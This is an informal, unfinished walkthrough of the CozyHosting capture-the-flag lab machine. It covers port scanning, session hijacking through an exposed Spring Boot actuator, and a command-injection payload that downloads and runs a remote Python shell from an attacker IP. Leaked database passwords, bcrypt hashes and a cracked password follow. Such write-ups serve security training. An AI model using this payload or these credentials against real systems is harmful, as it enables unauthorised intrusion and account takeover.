# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx cozyhosting.htb
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV cozyhosting.htb
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# HTTP (port 80)
after investicating, it seems it is Spring Boot running (JSP Java Server Pages)
we found some url in actuator
```
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET        1l        1w      495c http://cozyhosting.htb/actuator/sessions
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
```

the url http://cozyhosting.htb/actuator/sessions is interesting because we have kaderson that have a open session with his JSESSIONID exposed
we stole the id session and can access the admin back office

htb.cloudhosting.CozyHostingApp$$SpringCGLIB$$0


usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]%20%20%20%20%20%20%20%20%20%20 [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]%20%20%20%20%20%20%20%20%20%20 [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]%20%20%20%20%20%20%20%20%20%20 [-i identity_file] [-J [user@]host[:port]] [-L address]%20%20%20%20%20%20%20%20%20%20 [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]%20%20%20%20%20%20%20%20%20%20 [-Q query_option] [-R address] [-S ctl_path] [-W host:port]%20%20%20%20%20%20%20%20%20%20 [-w local_tun[:remote_tun]] destination [command [argument ...]]


localhost
kanderson@127.0.0.1;curl${IFS}http://10.10.14.136:8000/shell.py${IFS}-o${IFS}/tmp/shell.py;python3${IFS}/tmp/shell.py;#


server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR


kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin


 FakeUser.class
 username=kanderson&password=MRdEQuv6~6P9

this password doesnt work

but if we crack the admin password we found it is : manchesterunited
it's the josh password, we can use it with ssh

now we do a sudo -l, we have right to run ssh as root
